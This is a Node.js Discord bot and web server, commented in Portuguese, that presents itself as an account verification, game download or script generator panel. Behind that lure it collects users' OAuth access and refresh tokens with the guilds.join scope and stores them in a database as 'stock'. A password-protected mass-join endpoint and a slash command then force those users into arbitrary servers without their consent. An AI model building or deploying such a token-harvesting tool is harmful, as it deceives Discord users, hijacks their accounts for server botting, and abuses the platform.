require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// LINKS DE DESTINO
const TARGET_PADRAO = 'https://discord.com/app'; 
const TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
const TARGET_SCRIPT = 'https://key-scriptlp.onrender.com/sucess'; 

// --- BANCO DE DADOS ---
let pool = null;
async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
        try {
            await pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id VARCHAR(255) PRIMARY KEY, username VARCHAR(255), access_token TEXT, refresh_token TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);`);
            console.log('✅ Banco conectado.');
        } catch (err) { console.error("❌ Erro banco:", err.message); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });

// =================================================================
// FUNÇÃO MESTRA DE VERIFICAÇÃO
// =================================================================
async function processarVerificacao(req, res, redirectUri, finalTarget) {
    const { code, state } = req.query; 
    
    // Se chegou aqui sem código, algo deu errado no clique
    if (!code) return res.send('Erro: O Discord não enviou o código de autorização.');

    try {
        console.log(`[DEBUG] Processando login na rota: ${redirectUri}`);

        // 1. Troca o Código pelo Token
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET,
            code,
            grant_type: 'authorization_code',
            redirect_uri: redirectUri, // O SEGREDINHO: Tem que ser igual ao configurado
            scope: 'identify guilds.join',
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
        const user = userResponse.data;

        // 2. Salva no Banco
        if (pool) await pool.query(`INSERT INTO auth_users (id, username, access_token, refresh_token) VALUES ($1, $2, $3, $4) ON CONFLICT (id) DO UPDATE SET access_token = $3, refresh_token = $4;`, [user.id, user.username, access_token, refresh_token]);

        // 3. Verifica o State (ID do Servidor) e dá Cargo
        // Se vier do /script, o state tem "__script" no final
        let guildId = state;
        let isScriptMode = false;

        if (state && state.includes('__script')) {
            guildId = state.split('__')[0];
            isScriptMode = true;
        }

        if (guildId) {
            try {
                const guild = client.guilds.cache.get(guildId);
                if (guild) {
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    // Procura Auth2 Vetificados OU Vetificado
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados' || r.name === 'Vetificado');
                    
                    // Se for modo script e não tiver cargo, tenta criar (Opcional)
                    if (!role && isScriptMode) {
                        try { /* Lógica de criar cargo se quiser */ } catch(e){}
                    }

                    if (member && role) await member.roles.add(role);
                }
            } catch (e) { console.error("Erro ao dar cargo:", e.message); }
        }

        // 4. Log
        const ch = client.channels.cache.get(LOG_CHANNEL_ID);
        if(ch) ch.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token').setDescription(`**User:** ${user.username}\n**Rota:** ${isScriptMode ? 'Script' : 'Normal'}`).setColor('Green')] });

        // 5. Redireciona
        res.send(`
            <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sucesso</title><style>body{background:#2b2d31;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}.loader{border:4px solid #f3f3f3;border-top:4px solid #5865F2;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head>
            <body><div class="loader"></div><p>Verificado! Redirecionando...</p><script>setTimeout(()=>{window.location.href="${finalTarget}"}, 300);</script></body></html>
        `);

    } catch (e) { 
        console.error("[ERRO AUTH]", e.response ? e.response.data : e.message);
        res.send(`Erro na verificação. Verifique os Logs do Render.`); 
    }
}

// =================================================================
// ROTAS DO SITE
// =================================================================

// 1. ROTA PADRÃO (Painel 1)
app.get('/callback', async (req, res) => {
    await processarVerificacao(req, res, process.env.REDIRECT_URI, TARGET_PADRAO);
});

// 2. ROTA GAMEDOWN (Painel 2)
app.get('/auth2', async (req, res) => {
    if (!process.env.REDIRECT_URI_2) return res.send("Erro: REDIRECT_URI_2 não configurada.");
    await processarVerificacao(req, res, process.env.REDIRECT_URI_2, TARGET_GAME);
});

// 3. ROTA SCRIPT (Painel 3 - A que estava faltando!)
app.get('/script', async (req, res) => {
    if (!process.env.REDIRECT_URI_SCRIPT) return res.send("Erro: REDIRECT_URI_SCRIPT não configurada.");
    await processarVerificacao(req, res, process.env.REDIRECT_URI_SCRIPT, TARGET_SCRIPT);
});

// Outras rotas (Home, Painel Admin, API, Game Hub)
app.get('/', async (req, res) => {
    let c = 0; if(pool) { try{const r = await pool.query('SELECT COUNT(*) FROM auth_users'); c = r.rows[0].count;}catch(e){} }
    res.send(`Bot Online. Tokens: ${c} <a href="/painel">Admin</a>`);
});
app.get('/painel', (req, res) => res.send(`<form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha"><input type="text" name="serverId" placeholder="ID"><input type="number" name="amount" placeholder="Qtd"><button>Enviar</button></form>`));
app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if(password !== ADMIN_PASSWORD) return res.send('Senha errada');
    if(!pool) return res.send('Sem banco');
    let users = []; try { const r = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = r.rows; } catch(e){ return res.send('Erro busca'); }
    res.send(`Enviando ${users.length}...`);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    for (const u of users) {
        try { await axios.put(`https://discord.com/api/guilds/${serverId}/members/${u.id}`, { access_token: u.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); } 
        catch (e) { if(e.response?.status===401) pool.query('DELETE FROM auth_users WHERE id=$1',[u.id]).catch(()=>{}); }
        await sleep(1000);
    }
});
app.get('/game', (req, res) => res.send(`<h1>Game Hub</h1><p>Conteúdo Exclusivo.</p>`)); // (Pode usar o HTML bonito aqui se quiser)

// --- BOT DISCORD ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Auth (Padrão)' },
        { name: 'setup_auth2', description: 'Painel GameDown' },
        { name: 'setup_script', description: 'Painel Script (Novo)' }, 
        { name: 'estoque', description: 'Ver quantidade' },
        { name: 'enviar', description: 'Mass Join', options: [{name:'quantidade',type:4,required:true},{name:'servidor_id',type:3,required:true}] }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // SETUP SCRIPT (NOVO)
    if (interaction.commandName === 'setup_script') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        if (!process.env.REDIRECT_URI_SCRIPT) return interaction.reply('❌ Configure REDIRECT_URI_SCRIPT.');
        
        // Adiciona __script no state para sabermos a origem
        const stateData = `${interaction.guild.id}__script`;
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_SCRIPT)}&response_type=code&scope=identify+guilds.join&state=${stateData}`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Gerar Script').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('📜'));
        const embed = new EmbedBuilder().setTitle('🔑 Gerador de Scripts').setDescription('É necessário verificação!\nClique abaixo para validar sua conta e liberar o acesso.').setColor('Gold');

        interaction.reply({ content: 'Painel Script criado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // (Outros comandos setup_auth, setup_auth2, etc... mantenha-os aqui)
    if (interaction.commandName === 'setup_auth') {
        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        interaction.reply({content:'ok',ephemeral:true}); interaction.channel.send({components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar').setStyle(ButtonStyle.Link).setURL(url).setEmoji('✅'))]});
    }
    if (interaction.commandName === 'setup_auth2') {
        if (!process.env.REDIRECT_URI_2) return interaction.reply('Erro config');
        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        interaction.reply({content:'ok',ephemeral:true}); interaction.channel.send({components:[new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Baixar').setStyle(ButtonStyle.Link).setURL(url).setEmoji('🔗'))]});
    }
    if (interaction.commandName === 'estoque') {
        let c=0; if(pool){try{const r=await pool.query('SELECT COUNT(*) FROM auth_users');c=r.rows[0].count;}catch{}}
        interaction.reply({content:`Estoque: ${c}`, ephemeral:true});
    }
});

iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("ON"));
    client.login(process.env.BOT_TOKEN);
});
